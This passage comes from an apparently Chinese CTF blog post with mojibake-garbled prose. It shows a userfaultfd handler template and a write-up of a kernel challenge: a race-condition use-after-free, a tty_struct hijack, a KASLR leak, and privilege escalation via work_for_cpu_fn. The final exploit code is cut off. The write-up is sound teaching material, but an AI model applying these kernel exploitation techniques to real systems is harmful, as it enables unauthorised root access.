<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">registerUserFaultFd(addr, len, handler);<br></code></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ handler çš„å†™æ³•ï¼Œè¿™é‡Œç›´æ¥ç…§æŠ„ Linux man page æ”¹äº†æ”¹ï¼Œå¯ä»¥æ ¹æ®ä¸ªäººéœ€æ±‚è¿›è¡Œä¸ªæ€§åŒ–æ”¹åŠ¨ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// ä½ è¦æ‹·è´è¿›å»çš„æ•°æ®</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [åœ¨è¿™åœé¡¿.jpg]</span><br><span class="hljs-comment">         * å½“ poll è¿”å›æ—¶è¯´æ˜å‡ºç°äº†ç¼ºé¡µå¼‚å¸¸</span><br><span class="hljs-comment">         * ä½ å¯ä»¥åœ¨è¿™é‡Œæ’å…¥ä¸€äº›æ¯”å¦‚è¯´ sleep() ä¸€ç±»çš„æ“ä½œ</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook</h3><h4 id="â‘ -é¢˜ç›®åˆ†æ"><a href="#â‘ -é¢˜ç›®åˆ†æ" class="headerlink" title="â‘  é¢˜ç›®åˆ†æ"></a>â‘  é¢˜ç›®åˆ†æ</h4><p>é¦–å…ˆçœ‹ä¸€ä¸‹å¯åŠ¨è„šæœ¬ï¼ˆ<del>å†™å¾—å¾ˆ tmd ä¹±ï¼Œæ—©è¯¥é”¤é”¤å‡ºé¢˜äººäº†</del>ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>stty intr ^]<br>exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s<br></code></pre></td></tr></table></figure>

<p>å¼€äº† smapã€smepã€kaslr ä¿æŠ¤</p>
<p>æŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code></p>
<p><img src="https://i.loli.net/2021/09/10/TuDM8B52agPXiI4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¼€å¯äº† KPTI ï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰</p>
<p>ç»™äº†ä¸€ä¸ª LKM å« <code>notebook.ko</code>ï¼ŒæŒ‰æƒ¯ä¾‹è¿™åº”å½“å°±æ˜¯æœ‰æ¼æ´çš„æ¨¡å—äº†ï¼Œæ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å¤§è‡´æ˜¯åˆ›å»ºäº†ä¸€ä¸ª misc ç±»å‹çš„è®¾å¤‡ï¼Œå¹¶è‡ªå®šä¹‰äº† ioctlã€readã€write ä¸‰ä¸ªæ¥å£</p>
<p><img src="https://i.loli.net/2021/06/22/Ve8ifgAOLomTj4H.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ <code>note</code> çš„æ•°ç»„ <code>notebook</code>ï¼Œæœ‰ç€ä¸¤ä¸ªæˆå‘˜ï¼šsize å­˜å‚¨å †å—çš„å¤§å°ï¼Œbuf å­˜å‚¨æŒ‡å‘å †å—çš„åœ°å€</p>
<p><img src="https://i.loli.net/2021/06/22/eM1Dknsi8qPXIF7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¢˜ç›®è®¾å¤‡é€šè¿‡ ioctl æ¨¡æ‹Ÿäº†ä¸€ä¸ªèœå•ï¼ˆ<del>åˆæ˜¯èœå•å †</del>ï¼‰ï¼Œæä¾›äº†åˆ›å»ºã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/06/22/ebcs7dqulX152fg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ºå¦‚ä¸‹ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; userarg;<br></code></pre></td></tr></table></figure>

<p><code>noteadd()</code> ä¼šå‘ slub ç”³è¯·ä¸å¤§äº 0x60 çš„ objectï¼Œä¸è¿‡å¹¶ä¸ä¼šç›´æ¥æ‹·è´æ•°æ®åˆ° object ä¸­ï¼Œè€Œæ˜¯ä¼šæ‹·è´åˆ° <code>name</code> å­—ç¬¦æ•°ç»„</p>
<p><img src="https://i.loli.net/2021/06/22/6HVQLpBYk1S5EtK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><code>noteedit</code> ç”¨äºç¼–è¾‘æˆ‘ä»¬çš„ notebook ä¸­çš„ objectï¼Œè‹¥æ˜¯ size ä¸åŒåˆ™ä¼šè°ƒç”¨ kreallocï¼Œå¹¶å°†ç”¨æˆ·ç©ºé—´æ•°æ®æ‹·è´ 256 å­—èŠ‚è‡³å…¨å±€å˜é‡ name ä¸­ï¼Œå¦åˆ™ç›´æ¥è¿”å›ï¼Œä¸ add æ‰€ä¸åŒçš„æ˜¯ edit å¹¶ä¸ä¼šé™åˆ¶ size å¤§å°ï¼Œå› æ­¤<strong>è™½ç„¶ add é™åˆ¶äº† sizeï¼Œä½†æ˜¯é€šè¿‡ edit æˆ‘ä»¬ä»èƒ½è·å¾—ä»»æ„å¤§å°çš„ object</strong></p>
<p>åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼šedit ä½¿ç”¨çš„æ˜¯<strong>è¯»é”</strong>ï¼Œå¯ä»¥å¤šä¸ªè¿›ç¨‹å¹¶å‘ <code>realloc(buf, 0)</code> ï¼Œä»è€Œé€šè¿‡<strong>æ¡ä»¶ç«äº‰</strong>è¾¾åˆ° use after free çš„æ•ˆæœ</p>
<p><img src="https://i.loli.net/2021/07/31/2Q4vezhdZy61sAf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><code>notedel()</code> åˆ™è¢«ç”¨æ¥é‡Šæ”¾ objectï¼Œæ³¨æ„åˆ°åœ¨ <code>notedel()</code> å‡½æ•°ä¸­è‹¥æ˜¯ size ä¸º 0 åˆ™ä¸ä¼šæ¸…ç©ºï¼Œä¸è¿‡ä¸ ptmalloc æ‰€ä¸åŒçš„æ˜¯ï¼Œ<code>kmalloc(0)</code> å¹¶ä¸ä¼šåˆ†é…ä¸€ä¸ª object</p>
<p><img src="https://i.loli.net/2021/06/22/voBxLYPGEf9slDz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ³¨æ„åˆ°åœ¨ä¸åŒæ“ä½œä¸­è¿˜æœ‰ç€è¯»å†™é”ï¼Œä¸è¿‡ add å’Œ edit å ç”¨çš„æ˜¯<strong>è¯»</strong>ä½ï¼Œè€Œ delete å ç”¨çš„æ˜¯<strong>å†™</strong>ä½ï¼Œé€šä¿—åœ°è¯´ä¾¿æ˜¯ï¼šè¯»é”å¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œå¤šä¸ªè¿›ç¨‹æ­¤æ—¶å¯ä»¥åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºï¼Œè€Œå†™é”åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½å¤Ÿè¿›å…¥ä¸´ç•ŒåŒº</p>
<p><code>notegift()</code> å‡½æ•°åˆ™ä¼šç™½ç»™å‡ºåˆ†é…çš„ object çš„åœ°å€ï¼Œè¿™è®©æœ¬é¢˜éš¾åº¦ä¸‹é™ä¸å°‘ï¼š)</p>
<p><img src="https://i.loli.net/2021/06/22/1eUIDfFAsaqyOmY.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¢˜ç›®è®¾å¤‡çš„ <code>read()</code> åˆ™æ˜¯å¾ˆæ™®é€šçš„è¯»å–å¯¹åº” note å†…å®¹çš„åŠŸèƒ½ï¼Œè¯»å–çš„å¤§å°ä¸º notebook ç»“æ„ä½“æ•°ç»„ä¸­å­˜çš„ sizeï¼Œä¸‹æ ‡ä¸º read ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/06/22/m2XhBYuUbKVElH4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¢˜ç›®è®¾å¤‡çš„ <code>write()</code> ä¹Ÿæ˜¯å¾ˆæ™®é€šçš„å†™å…¥å¯¹åº” note å†…å®¹çš„åŠŸèƒ½ï¼Œå†™å…¥çš„å¤§å°ä¸º notebook ç»“æ„ä½“æ•°ç»„ä¸­å­˜çš„ sizeï¼Œä¸‹æ ‡ä¸º write ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/06/22/dMnI7hjfyQrZmC4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="â‘¡-æ¼æ´åˆ©ç”¨"><a href="#â‘¡-æ¼æ´åˆ©ç”¨" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨"></a>â‘¡ æ¼æ´åˆ©ç”¨</h4><h5 id="Step-I-userfaultfd-æ„é€ -UAF"><a href="#Step-I-userfaultfd-æ„é€ -UAF" class="headerlink" title="Step.I - userfaultfd æ„é€  UAF"></a>Step.I - userfaultfd æ„é€  UAF</h5><p>æ³¨æ„åˆ°åœ¨ mynote_edit å½“ä¸­ä½¿ç”¨äº† krealloc æ¥é‡åˆ†é… objectï¼Œéšåä½¿ç”¨ copy_fom_user ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼š</p>
<p><img src="https://i.loli.net/2021/09/09/LMEmgrIGoUjwDJ2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ï¼š</p>
<ul>
<li>åˆ†é…ä¸€ä¸ªç‰¹å®šå¤§å°çš„ note</li>
<li>æ–°å¼€ edit çº¿ç¨‹é€šè¿‡ <code>krealloc(0)</code> å°†å…¶é‡Šæ”¾<strong>ï¼Œå¹¶é€šè¿‡ userfaultfd å¡åœ¨è¿™é‡Œ</strong></li>
</ul>
<p><strong>æ­¤æ—¶ notebook æ•°ç»„ä¸­çš„ object å°šæœªè¢«æ¸…ç©ºï¼Œä»æ˜¯åŸå…ˆè¢«é‡Šæ”¾äº†çš„ objectï¼Œæˆ‘ä»¬åªéœ€è¦å†å°†å…¶åˆ†é…åˆ°åˆ«çš„å†…æ ¸ç»“æ„ä½“ä¸Šä¾¿èƒ½å®Œæˆ UAF</strong></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦é€‰æ‹© victim struct äº†ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©æœ€ç»å…¸çš„ <code>tty_struct</code> æ¥å®Œæˆåˆ©ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰“å¼€ <code>/dev/ptmx</code> ä¾¿èƒ½è·å¾—ä¸€ä¸ª <code>tty_struct</code> ï¼šï¼‰</p>
<h5 id="Step-II-æ³„éœ²å†…æ ¸åœ°å€"><a href="#Step-II-æ³„éœ²å†…æ ¸åœ°å€" class="headerlink" title="Step.II - æ³„éœ²å†…æ ¸åœ°å€"></a>Step.II - æ³„éœ²å†…æ ¸åœ°å€</h5><p>ç”±äºé¢˜ç›®æä¾›äº†è¯»å–å †å—çš„åŠŸèƒ½ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>tty_struct</code> ä¸­çš„ <code>tty_operations</code> æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œå…¶é€šå¸¸è¢«åˆå§‹åŒ–ä¸º<strong>å…¨å±€å˜é‡</strong> <code>ptm_unix98_ops</code> æˆ– <code>pty_unix98_ops </code></p>
<p>å¼€å¯äº† kaslr çš„å†…æ ¸åœ¨å†…å­˜ä¸­çš„åç§»ä¾ç„¶ä»¥å†…å­˜é¡µä¸ºç²’åº¦ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¯”å¯¹ tty_operations åœ°å€çš„ä½ä¸‰16è¿›åˆ¶ä½æ¥åˆ¤æ–­æ˜¯ <code>ptm_unix98_ops</code> è¿˜æ˜¯ <code>pty_unix98_ops </code></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®æ¨¡å—ä¸­çš„è¯»å†™åŠŸèƒ½ä¼šæ£€æŸ¥ notebook æ•°ç»„ä¸­çš„ sizeï¼Œè€Œåœ¨æˆ‘ä»¬é€šè¿‡ <code>krealloc(0)</code> æ„å»º UAF æ—¶å…¶è¢«ä¿®æ”¹ä¸º 0ï¼Œæ•…æˆ‘ä»¬éœ€è¦å°†å…¶ä¿®æ”¹å›é 0 å€¼</p>
<p>æ³¨æ„åˆ° <code>noteadd()</code> ä¸­ä¼šå…ˆä¿®æ”¹ notebook çš„ size å† <code>copy_from_user()</code> ï¼Œè¿™ç»™äº†æˆ‘ä»¬åˆ©ç”¨ userfaultfd çš„æœºä¼šï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>noteadd()</code> å°† size ä¿®æ”¹å›é 0 å€¼å¹¶é€šè¿‡ userfaultfd å°†å…¶å¡ä½ï¼ˆå¦åˆ™æˆ‘ä»¬çš„ UAF object æŒ‡é’ˆä¼šè¢«æ–°åˆ†é…çš„ object è¦†ç›–ï¼‰</p>
<p><img src="https://s2.loli.net/2023/02/07/6EPs7B41O5WS8y3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="Step-III-åŠ«æŒ-tty-operationsï¼Œæ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼Œwork-for-cpu-fn-ç¨³å®šåŒ–åˆ©ç”¨"><a href="#Step-III-åŠ«æŒ-tty-operationsï¼Œæ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼Œwork-for-cpu-fn-ç¨³å®šåŒ–åˆ©ç”¨" class="headerlink" title="Step.III - åŠ«æŒ tty_operationsï¼Œæ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼Œwork_for_cpu_fn() ç¨³å®šåŒ–åˆ©ç”¨"></a>Step.III - åŠ«æŒ tty_operationsï¼Œæ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼Œwork_for_cpu_fn() ç¨³å®šåŒ–åˆ©ç”¨</h5><p>ç”±äºé¢˜ç›®æä¾›äº†å†™å…¥å †å—çš„åŠŸèƒ½ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¿®æ”¹ <code>tty_struct-&gt;tty_operations</code> åæ“ä½œ ttyï¼ˆä¾‹å¦‚readã€writeã€ioctlâ€¦è¿™ä¼šè°ƒç”¨åˆ°å‡½æ•°è¡¨ä¸­çš„å¯¹åº”å‡½æ•°æŒ‡é’ˆï¼‰çš„æ–¹å¼åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ŒåŒæ—¶ <code>notegift()</code> ä¼šç™½ç»™å‡º notebook é‡Œå­˜çš„ object çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠ <code>fake tty_operations</code> å¸ƒç½®åˆ° note å½“ä¸­</p>
<p>ç°åœ¨æˆ‘ä»¬è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒçš„å·¥ä½œï¼ŒæŒ‰æƒ¯ä¾‹æˆ‘ä»¬éœ€è¦ <code>commit_creds(prepare_kernel_cred(NULL))</code> ï¼Œä¸è¿‡æˆ‘ä»¬å¾ˆéš¾ç›´æ¥ä¸€æ­¥æ‰§è¡Œåˆ°ä½ï¼Œå› æ­¤éœ€è¦åˆ†æ­¥æ‰§è¡Œå¹¶ä¿å­˜ä¸­é—´ç»“æœ</p>
<p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>work_for_cpu_fn()</code> å®Œæˆåˆ©ç”¨ï¼Œåœ¨å¼€å¯äº†å¤šæ ¸æ”¯æŒçš„å†…æ ¸ä¸­éƒ½æœ‰è¿™ä¸ªå‡½æ•°ï¼Œå®šä¹‰äº <code>kernel/workqueue.c</code> ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br>    <span class="hljs-type">long</span> (*fn)(<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">long</span> ret;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> work_struct *work)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> *<span class="hljs-title">wfc</span> =</span> container_of(work, <span class="hljs-keyword">struct</span> work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç®€å•åˆ†æå¯çŸ¥è¯¥å‡½æ•°å¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-type">size_t</span> * args)</span><br>&#123;<br>    args[<span class="hljs-number">6</span>] = ((<span class="hljs-type">size_t</span> (*) (<span class="hljs-type">size_t</span>)) (args[<span class="hljs-number">4</span>](args[<span class="hljs-number">5</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å³ <code>rdi + 0x20</code> å¤„ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ‰§è¡Œï¼Œå‚æ•°ä¸º <code>rdi + 0x28</code> å¤„å€¼ï¼Œè¿”å›å€¼å­˜æ”¾åœ¨ <code>rdi + 0x30</code> å¤„ï¼Œè€Œ <code>tty_operations</code> ä¸Šçš„å‡½æ•°æŒ‡é’ˆçš„ç¬¬ä¸€ä¸ªå‚æ•°å¤§éƒ½æ˜¯ <code>tty_struct</code> ï¼Œå¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å¯æ§çš„ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥<strong>å¾ˆæ–¹ä¾¿åœ°åˆ†æ¬¡æ‰§è¡Œ prepare_kernel_cred å’Œ commit_credsï¼Œä¸”ä¸ç”¨è€ƒè™‘ KPTI ç»•è¿‡ï¼Œç›´æ¥æ™®é€šåœ°è¿”å›ç”¨æˆ·æ€ä¾¿èƒ½å®Œæˆç¨³å®šåŒ–ææƒ</strong></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>tty_struct</code> çš„ç»“æ„ä¹Ÿè¢«æˆ‘ä»¬æ‰€ç ´åäº†ï¼Œå› æ­¤åœ¨å®Œæˆææƒä¹‹åæˆ‘ä»¬åº”è¯¥å°†å…¶å†…å®¹æ¢å¤åŸæ ·</p>
<h4 id="â‘¢-FINAL-EXPLOIT"><a href="#â‘¢-FINAL-EXPLOIT" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h4><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹æ‰€ç¤ºï¼ˆ<code>kernelpwn.h</code> è§æœ¬æ–‡å¼€å¤´ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 